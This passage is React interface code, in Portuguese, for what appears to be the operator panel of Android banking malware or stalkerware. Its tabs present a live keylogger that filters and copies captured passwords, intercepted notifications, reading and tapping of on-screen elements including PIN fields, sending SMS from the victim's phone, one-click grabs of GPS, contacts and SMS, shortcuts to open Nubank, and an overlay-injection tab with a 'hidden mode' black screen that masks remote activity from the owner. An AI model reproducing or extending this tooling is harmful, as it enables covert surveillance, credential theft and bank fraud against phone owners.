                  <div className="flex flex-col h-[520px] bg-[#060c18] rounded-xl border border-red-500/25 overflow-hidden shadow-inner font-mono">
                    {/* CabeÃ§alho do Chat */}
                    <div className="bg-gradient-to-r from-[#0a1835] via-[#0d224b] to-[#0a1835] p-2.5 border-b border-red-500/20 flex items-center justify-between shadow-sm">
                      <div className="flex items-center gap-2">
                        <div className="w-7 h-7 rounded-lg bg-gradient-to-br from-red-500/20 to-red-600/30 border border-red-400/50 flex items-center justify-center shadow-[0_0_10px_rgba(6,182,212,0.3)]">
                          <Bot className="w-3.5 h-3.5 text-red-400" />
                        </div>
                        <div>
                          <div className="text-[11px] font-black text-white flex items-center gap-1.5 uppercase font-mono">
                            <span>RobÃ´ Assistente IA</span>
                            <span className="w-1.5 h-1.5 rounded-full bg-rose-400 animate-pulse"></span>
                          </div>
                          <span className="text-[9px] text-red-400/80 font-mono">
                            O que pedir, executa no celular
                          </span>
                        </div>
                      </div>
                      <button
                        onClick={() =>
                          setAssistantMessages([
                            {
                              id: 'init-clean',
                              sender: 'bot',
                              text: 'ðŸ¤– Chat limpo! O que vocÃª deseja executar no aparelho agora?',
                              time: new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' })
                            }
                          ])
                        }
                        className="text-[9px] text-slate-400 hover:text-rose-300 px-2 py-1 bg-[#09152b] hover:bg-rose-950/40 border border-slate-700/50 hover:border-rose-500/40 rounded-lg transition-colors font-mono"
                        title="Limpar histÃ³rico do chat"
                      >
                        Limpar
                      </button>
                    </div>



                    {/* Feed de Mensagens com Scroll */}
                    <div className="flex-1 p-2.5 overflow-y-auto space-y-2.5 text-[11px] font-sans scrollbar-thin scrollbar-thumb-red-900">
                      {assistantMessages.map((msg) => (
                        <div
                          key={msg.id}
                          className={`flex flex-col ${msg.sender === 'user' ? 'items-end' : 'items-start'}`}
                        >
                          <div
                            className={`max-w-[90%] rounded-2xl px-3 py-2 leading-relaxed shadow-md ${
                              msg.sender === 'user'
                                ? 'bg-gradient-to-r from-red-600 to-red-600 text-white rounded-tr-none font-medium'
                                : 'bg-[#0a152a] border border-[#162f5e] text-slate-200 rounded-tl-none font-normal'
                            }`}
                          >
                            {msg.actionName && (
                              <div className="flex items-center gap-1.5 mb-1 pb-1 border-b border-white/10 font-mono text-[9px] text-pink-300 font-bold uppercase">
                                <span className="w-1.5 h-1.5 rounded-full bg-red-400"></span>
                                <span>AÃ§Ã£o: {msg.actionName}</span>
                              </div>
                            )}
                            <p className="whitespace-pre-line text-[11px]">{msg.text}</p>
                          </div>
                          <span className="text-[8.5px] font-mono text-slate-500 mt-0.5 px-1">
                            {msg.time}
                          </span>
                        </div>
                      ))}
                      {isAssistantTyping && (
                        <div className="flex items-center gap-1 text-red-400 text-xs font-mono py-1 px-2">
                          <span className="animate-bounce">â—</span>
                          <span className="animate-bounce delay-100">â—</span>
                          <span className="animate-bounce delay-200">â—</span>
                          <span className="text-[10px] text-slate-400 ml-1">RobÃ´ processando ordem...</span>
                        </div>
                      )}
                      <div ref={assistantChatBottomRef} />
                    </div>

                    {/* SugestÃµes RÃ¡pidas em Chips (Atalhos de 1 Clique) */}
                    <div className="px-2 py-1.5 bg-[#081224] border-t border-[#14264a] overflow-x-auto whitespace-nowrap flex gap-1.5 scrollbar-none">
                      {[
                        { label: 'ðŸ’¡ Ligar Tela', cmd: 'ligar a tela do celular' },
                        { label: 'ðŸ’¡ Lanterna', cmd: 'ligue a lanterna' },
                        { label: 'ðŸ“¸ Tirar Print', cmd: 'tirar print da tela' },
                        { label: 'ðŸ“± Home', cmd: 'ir para tela inicial' },
                        { label: 'â¬…ï¸ Voltar', cmd: 'voltar' },
                        { label: 'ðŸ”Š + Volume', cmd: 'aumentar volume' },
                        { label: 'ðŸ”‡ Silenciar', cmd: 'silenciar aparelho' },
                        { label: 'ðŸ“³ Vibrar', cmd: 'vibrar aparelho' },
                        { label: 'ðŸ”’ Bloquear', cmd: 'bloquear a tela' },
                        { label: 'ðŸ–¤ Tela Preta', cmd: 'ligar tela preta' },
                        { label: 'ðŸŸ¢ WhatsApp', cmd: 'abrir whatsapp' },
                        { label: 'ðŸŸ£ Nubank', cmd: 'abrir nubank' },
                        { label: 'ðŸ“ GPS', cmd: 'pegar localizacao gps' },
                        { label: 'ðŸ‘¥ Contatos', cmd: 'pegar contatos' },
                        { label: 'ðŸ’¬ Ver SMS', cmd: 'ler sms' }
                      ].map((chip, idx) => (
                        <button
                          key={idx}
                          onClick={() => handleAssistantCommand(chip.cmd)}
                          className="px-2 py-1 bg-[#0c1c38] hover:bg-[#122b56] border border-red-500/30 hover:border-red-400 text-pink-300 rounded-lg text-[9.5px] font-mono font-bold transition-all shrink-0 shadow-sm"
                        >
                          {chip.label}
                        </button>
                      ))}
                    </div>

                    {/* Input do Chat */}
                    <form
                      onSubmit={(e) => {
                        e.preventDefault();
                        handleAssistantCommand(assistantInput);
                      }}
                      className="p-2 bg-[#09152b] border-t border-red-500/20 flex items-center gap-1.5"
                    >
                      <input
                        type="text"
                        value={assistantInput}
                        onChange={(e) => setAssistantInput(e.target.value)}
                        placeholder="PeÃ§a algo para o robÃ´ executar..."
                        className="flex-1 bg-[#060c18] border border-[#162e58] focus:border-red-400 focus:ring-1 focus:ring-red-400/50 text-red-100 placeholder:text-slate-500 text-[11px] rounded-xl px-3 py-2 font-mono outline-none transition-all"
                      />
                      <button
                        type="submit"
                        disabled={!assistantInput.trim()}
                        className="p-2 bg-gradient-to-r from-red-600 to-red-600 hover:from-red-500 hover:to-red-500 disabled:opacity-40 disabled:pointer-events-none text-white rounded-xl shadow-[0_0_12px_rgba(6,182,212,0.3)] transition-all shrink-0"
                        title="Enviar comando"
                      >
                        <Send className="w-3.5 h-3.5" />
                      </button>
                    </form>
                  </div>
                )}

                {/* Aba: ELEMENTOS DETECTADOS NA TELA V2 */}
                {sidePanelTab === 'v2_elements' && (
                  <div className="flex flex-col h-[530px] bg-[#050b18]/95 rounded-2xl border border-red-500/35 overflow-hidden p-3 shadow-[0_0_30px_rgba(0,240,255,0.15)] font-mono text-xs space-y-2.5 backdrop-blur-xl">
                    {/* CabeÃ§alho do Painel V2 */}
                    <div className="flex items-center justify-between border-b border-red-500/25 pb-2.5 bg-gradient-to-r from-red-950/40 via-blue-950/40 to-red-950/40 p-2 rounded-xl border border-red-500/20">
                      <div className="flex items-center gap-2.5">
                        <div className="w-8 h-8 rounded-xl bg-gradient-to-br from-red-500/30 to-red-600/40 border border-red-400/60 flex items-center justify-center shadow-[0_0_12px_rgba(0,240,255,0.3)]">
                          <Grid className="w-4 h-4 text-pink-300" />
                        </div>
                        <div>
                          <div className="text-xs font-black text-white uppercase tracking-wider flex items-center gap-2">
                            <span>ELEMENTOS TELA V2</span>
                            <span className="text-[9px] px-2 py-0.5 rounded-full bg-red-500/25 text-pink-200 border border-red-400/50 font-mono font-black shadow-[0_0_8px_rgba(0,240,255,0.3)] animate-pulse">
                              {filteredV2SideNodes.length} ITENS
                            </span>
                          </div>
                          <span className="text-[9px] text-pink-300/70 font-mono">Clique para interagir diretamente no aparelho</span>
                        </div>
                      </div>
                      <button
                        onClick={() => {
                          sendCommand({ action: 'REQUEST_HIERARCHY' });
                          fetchHierarchy();
                          showToast('Atualizando leitura da Tela V2...', 'info');
                        }}
                        className="p-2 rounded-xl bg-red-950/80 hover:bg-red-900 border border-red-500/50 text-pink-300 hover:text-white transition-all shadow-[0_0_10px_rgba(0,240,255,0.25)] active:scale-95"
                        title="Atualizar Leitura da Tela V2"
                      >
                        <RefreshCw className="w-3.5 h-3.5" />
                      </button>
                    </div>

                    {/* Input de Busca Cyberpunk */}
                    <div className="relative">
                      <Search className="w-3.5 h-3.5 absolute left-3 top-3 text-red-400/70" />
                      <input
                        type="text"
                        placeholder="Filtrar elemento por texto..."
                        value={v2SideSearchText}
                        onChange={(e) => setV2SideSearchText(e.target.value)}
                        className="w-full bg-[#030919] border border-red-500/40 rounded-xl pl-9 pr-3 py-2 text-xs text-white placeholder-red-400/40 focus:outline-none focus:border-pink-300 focus:ring-1 focus:ring-red-400/50 shadow-inner font-mono"
                      />
                    </div>

                    {/* Filtros por Categoria Pill Tabs */}
                    <div className="flex items-center gap-1.5 text-[10px] font-mono font-bold">
                      <button
                        type="button"
                        onClick={() => setV2SideFilterCategory('all')}
                        className={`px-2.5 py-1 rounded-xl transition-all ${
                          v2SideFilterCategory === 'all'
                            ? 'bg-gradient-to-r from-red-500 to-red-600 text-white font-black shadow-[0_0_12px_rgba(0,240,255,0.4)] border border-pink-300/50'
                            : 'bg-[#081226] text-slate-400 hover:text-pink-300 border border-slate-800'
                        }`}
                      >
                        Todos ({visibleV2Nodes.length})
                      </button>
                      <button
                        type="button"
                        onClick={() => setV2SideFilterCategory('interactive')}
                        className={`px-2.5 py-1 rounded-xl transition-all ${
                          v2SideFilterCategory === 'interactive'
                            ? 'bg-gradient-to-r from-rose-500 to-rose-600 text-white font-black shadow-[0_0_12px_rgba(16,185,129,0.4)] border border-emerald-300/50'
                            : 'bg-[#081226] text-slate-400 hover:text-emerald-300 border border-slate-800'
                        }`}
                      >
                        BotÃµes/Toques
                      </button>
                      <button
                        type="button"
                        onClick={() => setV2SideFilterCategory('input')}
                        className={`px-2.5 py-1 rounded-xl transition-all ${
                          v2SideFilterCategory === 'input'
                            ? 'bg-gradient-to-r from-amber-500 to-orange-600 text-white font-black shadow-[0_0_12px_rgba(245,158,11,0.4)] border border-amber-300/50'
                            : 'bg-[#081226] text-slate-400 hover:text-amber-300 border border-slate-800'
                        }`}
                      >
                        Inputs/Senhas
                      </button>
                    </div>

                    {/* Lista ScrollÃ¡vel de Elementos Estilizados */}
                    <div className="flex-1 overflow-y-auto space-y-2 pr-1 custom-scrollbar">
                      {filteredV2SideNodes.length === 0 ? (
                        <div className="text-center py-12 space-y-3 bg-[#030814]/60 border border-dashed border-red-500/20 rounded-2xl p-4">
                          <Grid className="w-9 h-9 text-red-500/40 mx-auto animate-pulse" />
                          <p className="text-slate-400 text-xs font-mono">Nenhum elemento encontrado na leitura V2.</p>
                          <button
                            onClick={() => {
                              sendCommand({ action: 'REQUEST_HIERARCHY' });
                              fetchHierarchy();
                            }}
                            className="px-4 py-1.5 bg-gradient-to-r from-red-600 to-red-600 hover:from-red-500 hover:to-red-500 text-white rounded-xl text-[10px] font-black uppercase tracking-wider shadow-[0_0_15px_rgba(0,240,255,0.3)] transition-all"
                          >
                            Ler Tela Agora
                          </button>
                        </div>
                      ) : (
                        filteredV2SideNodes.map((node, idx) => {
                          const label = (node.text || node.desc || node.hint || node.id || 'Elemento sem texto').trim();
                          const isClick = node.clickable || (node as any).button;
                          const isPwd = node.password || node.editable || node.isPinDigit;
                          const nodeKey = getNodeKey(node);
                          const isSelected = v2SelectedNode && getNodeKey(v2SelectedNode) === nodeKey;
                          const isHovered = v2HoveredNodeKey === nodeKey;

                          return (
                            <div
                              key={idx}
                              onClick={() => handleElementClick(node)}
                              onMouseEnter={() => setV2HoveredNodeKey(nodeKey)}
                              onMouseLeave={() => setV2HoveredNodeKey(null)}
                              className={`p-2.5 rounded-2xl border transition-all duration-200 cursor-pointer flex items-center justify-between gap-2.5 group ${
                                isSelected
                                  ? 'bg-gradient-to-r from-red-950/90 via-blue-950/90 to-red-950/90 border-pink-300 shadow-[0_0_20px_rgba(0,240,255,0.45)] ring-1 ring-red-400/60'
                                  : isHovered
                                  ? 'bg-[#0b2246] border-red-400 shadow-[0_0_18px_rgba(0,240,255,0.35)] scale-[1.01]'
                                  : 'bg-[#07132a]/90 hover:bg-[#0b1d3d] border-red-500/25 hover:border-red-400/60 shadow-md hover:shadow-[0_0_16px_rgba(0,240,255,0.25)] hover:-translate-y-0.5'
                              }`}
                            >
                              {/* Ãcone e Textos do Elemento */}
                              <div className="min-w-0 flex items-center gap-2.5 flex-1">
                                <div
                                  className={`w-7 h-7 rounded-xl flex items-center justify-center shrink-0 border text-xs shadow-sm ${
                                    isPwd
                                      ? 'bg-amber-500/20 border-amber-400/60 text-amber-300 shadow-[0_0_10px_rgba(245,158,11,0.3)]'
                                      : isClick
                                      ? 'bg-red-500/20 border-red-400/60 text-pink-300 shadow-[0_0_10px_rgba(0,240,255,0.3)]'
                                      : 'bg-red-500/20 border-red-400/50 text-pink-300'
                                  }`}
                                >
                                  {isPwd ? 'ðŸ”‘' : isClick ? 'ðŸ‘†' : 'ðŸ’¬'}
                                </div>

                                <div className="min-w-0 flex-1 space-y-0.5">
                                  <div className="text-xs font-black text-white font-mono tracking-wide truncate group-hover:text-pink-200 transition-colors">
                                    {label}
                                  </div>
                                  <div className="text-[9px] text-red-400/70 font-mono truncate flex items-center gap-1">
                                    <span className="text-slate-500">Coord:</span>
                                    <span>{node.bounds ? `x:${node.bounds.x} y:${node.bounds.y} w:${node.bounds.w} h:${node.bounds.h}` : 'N/A'}</span>
                                  </div>
                                </div>
                              </div>

                              {/* BotÃ£o de AÃ§Ã£o Clicar */}
                              <button
                                type="button"
                                onClick={(e) => {
                                  e.stopPropagation();
                                  handleElementClick(node);
                                }}
                                className="px-3 py-1.5 rounded-xl bg-gradient-to-r from-red-500 to-red-600 hover:from-red-400 hover:to-red-500 text-white font-mono font-black text-[10px] uppercase tracking-wider shadow-[0_0_14px_rgba(0,240,255,0.4)] active:scale-95 transition-all flex items-center gap-1 shrink-0"
                                title="Enviar toque direto neste elemento"
                              >
                                <Zap className="w-3 h-3 text-white fill-current" />
                                <span>Clicar</span>
                              </button>
                            </div>
                          );
                        })
                      )}
                    </div>
                  </div>
                )}

              {/* Aba 1: NotificaÃ§Ãµes em Tempo Real */}
              {sidePanelTab === 'notifications' && (
                <div className="space-y-2">
                  <div className="flex items-center justify-between border-b border-[#14233e] pb-1.5">
                    <span className="text-[11px] font-black text-white uppercase">Mural de NotificaÃ§Ãµes</span>
                    <button
                      onClick={fetchNotifications}
                      className="text-[10px] text-red-400 hover:text-pink-300 flex items-center gap-1"
                    >
                      <RefreshCw className={`w-3 h-3 ${isLoadingNotifications ? 'animate-spin' : ''}`} />
                      Atualizar
                    </button>
                  </div>

                  <div className="space-y-2 max-h-[520px] overflow-y-auto pr-1">
                    {notifications.length === 0 ? (
                      <div className="text-center py-10 text-slate-500 text-[11px]">
                        Nenhuma notificaÃ§Ã£o capturada recentemente.
                      </div>
                    ) : (
                      notifications.map((notif: any, idx: number) => {
                        const appName = getCleanAppName(notif.package, notif.appName || notif.app_name);
                        const timeDisplay = formatNotificationTime(notif);

                        return (
                          <div
                            key={notif.id || idx}
                            className="bg-[#091224] border border-[#14233e] hover:border-red-500/40 rounded-xl p-2.5 space-y-1.5 transition-all"
                          >
                            <div className="flex items-center justify-between">
                              <div className="flex items-center gap-1.5 truncate max-w-[200px]">
                                {getAppIcon(notif.package, appName)}
                                <span className="font-bold text-[10.5px] text-pink-300 truncate">
                                  {appName}
                                </span>
                              </div>
                              <span className="text-[9px] text-slate-400 font-mono shrink-0" title={notif.created_at || notif.timestamp}>
                                {timeDisplay}
                              </span>
                            </div>
                            {notif.title && <div className="text-[11px] font-bold text-white font-sans leading-tight">{notif.title}</div>}
                            <div className="text-[10px] text-slate-200 font-sans leading-relaxed break-words">
                              {notif.text || notif.message || ''}
                            </div>
                          </div>
                        );
                      })
                    )}
                  </div>
                </div>
              )}

              {/* Aba 2: Keylogger em Tempo Real */}
              {sidePanelTab === 'keylogger' && (
                <div className="space-y-2">
                  <div className="flex items-center justify-between border-b border-[#14233e] pb-1.5">
                    <span className="text-[11px] font-black text-white uppercase flex items-center gap-1.5">
                      <Keyboard className="w-3.5 h-3.5 text-red-400" />
                      Keylogger ({keylogs.length})
                    </span>
                    <button
                      onClick={fetchKeylogs}
                      className="text-[10px] text-red-400 hover:text-pink-300 flex items-center gap-1"
                    >
                      <RefreshCw className={`w-3 h-3 ${isLoadingKeylogs ? 'animate-spin' : ''}`} />
                      Atualizar
                    </button>
                  </div>

                  {/* Campo de Busca & Filtros */}
                  <div className="space-y-1.5">
                    <input
                      type="text"
                      placeholder="Filtrar teclas / app / senhas..."
                      value={keylogSearch}
                      onChange={(e) => setKeylogSearch(e.target.value)}
                      className="w-full bg-[#0a1426] border border-[#152442] rounded-lg px-2 py-1 text-[10px] text-white placeholder-slate-500 outline-none focus:border-red-500 font-mono"
                    />
                    <div className="flex items-center gap-1 text-[8px] font-bold overflow-x-auto pb-0.5">
                      <button
                        type="button"
                        onClick={() => setKeylogFilterType('all')}
                        className={`px-2 py-0.5 rounded-md border transition-all ${
                          keylogFilterType === 'all'
                            ? 'bg-red-600 text-white border-red-400 font-black'
                            : 'bg-[#0a1426] text-slate-400 border-[#14233e] hover:text-white'
                        }`}
                      >
                        Todos
                      </button>
                      <button
                        type="button"
                        onClick={() => setKeylogFilterType('passwords')}
                        className={`px-2 py-0.5 rounded-md border transition-all flex items-center gap-1 ${
                          keylogFilterType === 'passwords'
                            ? 'bg-amber-500 text-black border-amber-300 font-black shadow-[0_0_8px_rgba(245,158,11,0.5)]'
                            : 'bg-[#0a1426] text-amber-400 border-[#14233e] hover:border-amber-500/50'
                        }`}
                      >
                        ðŸ”‘ Senhas
                      </button>
                      <button
                        type="button"
                        onClick={() => setKeylogFilterType('typed')}
                        className={`px-2 py-0.5 rounded-md border transition-all flex items-center gap-1 ${
                          keylogFilterType === 'typed'
                            ? 'bg-red-500 text-black border-pink-300 font-black shadow-[0_0_8px_rgba(6,182,212,0.5)]'
                            : 'bg-[#0a1426] text-red-400 border-[#14233e] hover:border-red-500/50'
                        }`}
                      >
                        âŒ¨ï¸ DigitaÃ§Ãµes
                      </button>
                      <button
                        type="button"
                        onClick={() => setKeylogFilterType('windows')}
                        className={`px-2 py-0.5 rounded-md border transition-all flex items-center gap-1 ${
                          keylogFilterType === 'windows'
                            ? 'bg-indigo-600 text-white border-indigo-400 font-black'
                            : 'bg-[#0a1426] text-slate-400 border-[#14233e] hover:text-white'
                        }`}
                      >
                        ðŸ“± Telas
                      </button>
                    </div>
                  </div>

                  <div className="space-y-2 max-h-[500px] overflow-y-auto pr-1">
                    {keylogs.length === 0 ? (
                      <div className="text-center py-10 text-slate-500 text-[11px]">
                        Nenhum registro de keylogger capturado atÃ© o momento.
                      </div>
                    ) : (
                      keylogs
                        .map((k: any) => parseKeylogRecord(k))
                        .filter((item: ParsedKeylogItem) => {
                          if (keylogFilterType === 'passwords' && !item.isPassword) return false;
                          if (keylogFilterType === 'typed' && item.displayCategory !== 'typed' && item.displayCategory !== 'password') return false;
                          if (keylogFilterType === 'windows' && item.displayCategory !== 'window') return false;
                          if (keylogSearch) {
                            const search = keylogSearch.toLowerCase();
                            return (
                              item.appName.toLowerCase().includes(search) ||
                              item.package.toLowerCase().includes(search) ||
                              item.mainText.toLowerCase().includes(search) ||
                              item.subInfo.toLowerCase().includes(search) ||
                              item.text.toLowerCase().includes(search)
                            );
                          }
                          return true;
                        })
                        .map((item: ParsedKeylogItem, idx: number) => {
                          return (
                            <div
                              key={item.id || idx}
                              className={`bg-[#091224] border ${
                                item.isPassword
                                  ? 'border-amber-500/50 bg-gradient-to-r from-amber-950/20 via-[#091224] to-[#091224] shadow-[0_0_12px_rgba(245,158,11,0.15)]'
                                  : 'border-[#14233e] hover:border-red-500/40'
                              } rounded-xl p-2.5 space-y-1.5 transition-all`}
                            >
                              <div className="flex items-center justify-between">
                                <div className="flex items-center gap-1.5 truncate max-w-[200px]">
                                  {getAppIcon(item.package, item.appName)}
                                  <span className="font-bold text-[10px] text-pink-300 truncate">
                                    {item.appName}
                                  </span>
                                  {item.isPassword && (
                                    <span className="text-[8px] px-1.5 py-0.2 bg-amber-500/20 text-amber-300 border border-amber-500/40 rounded uppercase font-bold shrink-0">
                                      ðŸ”‘ Senha
                                    </span>
                                  )}
                                  {!item.isPassword && item.displayCategory === 'typed' && (
                                    <span className="text-[8px] px-1 py-0.2 bg-red-500/20 text-pink-300 border border-red-500/30 rounded uppercase font-bold shrink-0">
                                      âŒ¨ï¸ Digitado
                                    </span>
                                  )}
                                  {item.displayCategory === 'window' && (
                                    <span className="text-[8px] px-1 py-0.2 bg-red-500/20 text-pink-300 border border-red-500/30 rounded uppercase font-bold shrink-0">
                                      ðŸ“± Tela
                                    </span>
                                  )}
                                  {item.isOffline && (
                                    <span className="text-[8px] px-1 py-0.2 bg-purple-500/20 text-purple-300 border border-purple-500/30 rounded uppercase font-bold shrink-0">
                                      Offline
                                    </span>
                                  )}
                                </div>
                                <span className="text-[9px] text-slate-500 shrink-0" title={item.dateStr}>
                                  {item.timeStr}
                                </span>
                              </div>

                              {item.subInfo && (
                                <div className="text-[9px] text-slate-400 font-mono truncate">
                                  <span className="text-slate-500">Info: </span>{item.subInfo}
                                </div>
                              )}

                              {item.isPassword ? (
                                <div className="bg-[#140f06] border border-amber-500/40 rounded-lg p-2 flex items-center justify-between gap-2 shadow-inner">
                                  <div className="flex items-center gap-1.5 overflow-hidden">
                                    <Key className="w-3.5 h-3.5 text-amber-400 shrink-0" />
                                    <span className="font-mono font-black text-amber-200 text-[11px] tracking-wider select-all break-all">
                                      {item.mainText}
                                    </span>
                                  </div>
                                  <button
                                    onClick={() => {
                                      navigator.clipboard.writeText(item.mainText);
                                      showToast('Senha copiada!', 'success');
                                    }}
                                    className="p-1 rounded bg-amber-500/20 hover:bg-amber-500/40 text-amber-300 shrink-0 transition-all"
                                    title="Copiar Senha"
                                  >
                                    <Copy className="w-3 h-3" />
                                  </button>
                                </div>
                              ) : item.displayCategory === 'typed' ? (
                                <div className="bg-[#060c18] border border-red-500/30 rounded-lg p-2 flex items-center justify-between gap-2 shadow-inner">
                                  <span className="font-sans font-semibold text-slate-100 text-[11px] leading-relaxed select-all break-all">
                                    {item.mainText}
                                  </span>
                                  <button
                                    onClick={() => {
                                      navigator.clipboard.writeText(item.mainText);
                                      showToast('Texto copiado!', 'success');
                                    }}
                                    className="p-1 rounded bg-[#0c1830] hover:bg-red-500/20 text-red-400 shrink-0 transition-all"
                                    title="Copiar Texto"
                                  >
                                    <Copy className="w-3 h-3" />
                                  </button>
                                </div>
                              ) : item.displayCategory === 'window' ? (
                                <div className="bg-[#060c18] border border-[#14233e] rounded-lg px-2.5 py-1.5 flex items-center gap-2 text-slate-300 text-[10px] font-mono">
                                  <Tv className="w-3 h-3 text-red-400 shrink-0" />
                                  <span className="truncate">{item.mainText}</span>
                                </div>
                              ) : item.displayCategory === 'click' ? (
                                <div className="bg-[#060c18] border border-[#14233e] rounded-lg px-2.5 py-1.5 flex items-center gap-2 text-slate-300 text-[10px] font-mono">
                                  <Zap className="w-3 h-3 text-emerald-400 shrink-0" />
                                  <span className="truncate">{item.mainText}</span>
                                </div>
                              ) : (
                                <div className="bg-[#060c18] border border-[#14233e] rounded-lg px-2.5 py-1.5 text-slate-300 text-[10px] font-mono">
                                  <span className="truncate">{item.mainText}</span>
                                </div>
                              )}
                            </div>
                          );
                        })
                    )}
                  </div>
                </div>
              )}

              {/* Aba 2: Controles RÃ¡pidos de Hardware */}
              {sidePanelTab === 'quick_controls' && (
                <div className="space-y-3 pt-1">
                  <div className="flex items-center justify-between border-b border-[#14233e] pb-1.5">
                    <span className="text-[11px] font-black text-white uppercase">Ajustes RÃ¡pidos</span>
                    <span className="text-[10px] text-emerald-400">ðŸ”‹ {batteryLevel}%</span>
                  </div>

                  {/* Modos de Som */}
                  <div className="grid grid-cols-3 gap-1.5">
                    <button
                      onClick={() => handleSetSoundMode('silent')}
                      className={`py-1.5 rounded-lg border text-[10px] font-bold uppercase transition-all ${
                        soundMode === 'silent' ? 'bg-rose-950 border-rose-500 text-rose-300' : 'bg-[#091224] border-[#162744] text-slate-400'
                      }`}
                    >
                      Mudo
                    </button>
                    <button
                      onClick={() => handleSetSoundMode('vibrate')}
                      className={`py-1.5 rounded-lg border text-[10px] font-bold uppercase transition-all ${
                        soundMode === 'vibrate' ? 'bg-amber-950 border-amber-500 text-amber-300' : 'bg-[#091224] border-[#162744] text-slate-400'
                      }`}
                    >
                      Vibrar
                    </button>
                    <button
                      onClick={() => handleSetSoundMode('sound')}
                      className={`py-1.5 rounded-lg border text-[10px] font-bold uppercase transition-all ${
                        soundMode === 'sound' ? 'bg-red-950 border-red-500 text-pink-300' : 'bg-[#091224] border-[#162744] text-slate-400'
                      }`}
                    >
                      Som
                    </button>
                  </div>

                  {/* Sliders RÃ¡pidos */}
                  <div className="space-y-2">
                    <div>
                      <div className="flex justify-between text-[10px]">
                        <span className="text-slate-300">Brilho</span>
                        <span className="text-red-400 font-bold">{brightness}%</span>
                      </div>
                      <input
                        type="range"
                        min="0"
                        max="100"
                        value={brightness}
                        onChange={(e) => {
                          const val = Number(e.target.value);
                          setBrightness(val);
                          sendCommand({ action: 'SET_BRIGHTNESS', value: val });
                        }}
                        className="w-full accent-red-500 h-1 bg-[#0e1b33] rounded cursor-pointer"
                      />
                    </div>

                    <div>
                      <div className="flex justify-between text-[10px]">
                        <span className="text-slate-300">Volume de MÃ­dia</span>
                        <span className="text-red-400 font-bold">{musicVolume}%</span>
                      </div>
                      <input
                        type="range"
                        min="0"
                        max="100"
                        value={musicVolume}
                        onChange={(e) => {
                          const val = Number(e.target.value);
                          setMusicVolume(val);
                          sendCommand({ action: 'SET_VOLUME', stream: 'music', volume: val });
                        }}
                        className="w-full accent-red-500 h-1 bg-[#0e1b33] rounded cursor-pointer"
                      />
                    </div>

                    <div>
                      <div className="flex justify-between text-[10px]">
                        <span className="text-slate-300">Volume do Toque</span>
                        <span className="text-red-400 font-bold">{ringingVolume}%</span>
                      </div>
                      <input
                        type="range"
                        min="0"
                        max="100"
                        value={ringingVolume}
                        onChange={(e) => {
                          const val = Number(e.target.value);
                          setRingingVolume(val);
                          sendCommand({ action: 'SET_VOLUME', stream: 'ring', volume: val });
                        }}
                        className="w-full accent-red-500 h-1 bg-[#0e1b33] rounded cursor-pointer"
                      />
                    </div>
                  </div>

                  {/* Toggles de Rede */}
                  <div className="space-y-1.5 pt-1 border-t border-[#14233e]">
                    <div className="flex items-center justify-between bg-[#091224] p-2 rounded-lg border border-[#14233e]">
                      <span className="text-[10px] font-bold text-slate-300">Wi-Fi</span>
                      <button
                        onClick={() => {
                          const next = !wifiEnabled;
                          setWifiEnabled(next);
                          sendCommand({ action: 'TOGGLE_WIFI', enabled: next });
                        }}
                        className={`w-8 h-4 rounded-full p-0.5 flex items-center transition-all ${
                          wifiEnabled ? 'bg-[#0070f3] justify-end' : 'bg-[#15233e] justify-start'
                        }`}
                      >
                        <div className="w-3 h-3 rounded-full bg-white" />
                      </button>
                    </div>

                    <div className="flex items-center justify-between bg-[#091224] p-2 rounded-lg border border-[#14233e]">
                      <span className="text-[10px] font-bold text-slate-300">Lanterna / Flash</span>
                      <button
                        onClick={() => {
                          const next = !torchEnabled;
                          setTorchEnabled(next);
                          sendCommand({ action: 'TOGGLE_TORCH', enabled: next });
                        }}
                        className={`w-8 h-4 rounded-full p-0.5 flex items-center transition-all ${
                          torchEnabled ? 'bg-amber-500 justify-end' : 'bg-[#15233e] justify-start'
                        }`}
                      >
                        <div className="w-3 h-3 rounded-full bg-white" />
                      </button>
                    </div>
                  </div>
                </div>
              )}

              {/* Aba 3: Envio RÃ¡pido de SMS */}
              {sidePanelTab === 'sms_quick' && (
                <div className="space-y-3 pt-1">
                  <div className="flex items-center justify-between border-b border-[#14233e] pb-1.5">
                    <span className="text-[11px] font-black text-white uppercase">SMS RÃ¡pido</span>
                    <button onClick={fetchSms} className="text-[10px] text-red-400">Atualizar</button>
                  </div>

                  <form onSubmit={handleSendSms} className="space-y-2">
                    <input
                      type="text"
                      placeholder="NÃºmero (ex: 11987654321)"
                      value={smsToNumber}
                      onChange={(e) => setSmsToNumber(e.target.value)}
                      className="w-full bg-[#0a1426] border border-[#152442] rounded-lg p-2 text-xs text-white outline-none"
                    />
                    <textarea
                      placeholder="Mensagem SMS..."
                      value={smsBody}
                      onChange={(e) => setSmsBody(e.target.value)}
                      rows={3}
                      className="w-full bg-[#0a1426] border border-[#152442] rounded-lg p-2 text-xs text-white outline-none resize-none font-sans"
                    />
                    <button
                      type="submit"
                      className="w-full py-2 bg-[#0070f3] text-white rounded-lg font-bold text-xs uppercase shadow-md"
                    >
                      Enviar SMS do Celular
                    </button>
                  </form>
                </div>
              )}

              {/* Aba: BLOCO DE NOTAS & GERENCIADOR ESTRUTURADO DE SENHAS DO APARELHO */}
              {sidePanelTab === 'notes' && (
                <StructuredNotesManager
                  deviceId={deviceId || 'default'}
                  deviceNotes={deviceNotes}
                  onNotesChange={handleNotesChange}
                  sendCommand={sendCommand}
                  showToast={showToast}
                />
              )}

              {/* Aba 4: Central de Injects & Tela Preta */}
              {sidePanelTab === 'injects' && (
                <div className="space-y-3 pt-1 font-mono">
                  <div className="flex items-center justify-between border-b border-[#14233e] pb-1.5">
                    <span className="text-[11px] font-black text-pink-300 uppercase flex items-center gap-1">
                      ðŸŽ­ Injects & Overlays (Prontos)
                    </span>
                    <span className="text-[9px] text-emerald-400 font-bold">AO VIVO</span>
                  </div>

                  {/* BotÃµes de AÃ§Ã£o Principal */}
                  <div className="space-y-2">
                    <button
                      onClick={() => handleToggleBlackScreen(!isBlackScreen)}
                      className={`w-full py-2 px-3 rounded-xl border text-xs font-bold uppercase transition-all flex items-center justify-center gap-2 ${
                        isBlackScreen
                          ? 'bg-red-500 text-black border-pink-300 font-black shadow-[0_0_15px_rgba(6,182,212,0.6)]'
                          : 'bg-[#0a1426] border-[#152442] text-pink-300 hover:text-white hover:border-red-500/50'
                      }`}
                    >
                      <EyeOff className="w-4 h-4" />
                      {isBlackScreen ? 'ðŸ‘ï¸ Desativar Tela Preta' : 'ðŸ•¶ï¸ Ativar Tela Preta (Modo Oculto)'}
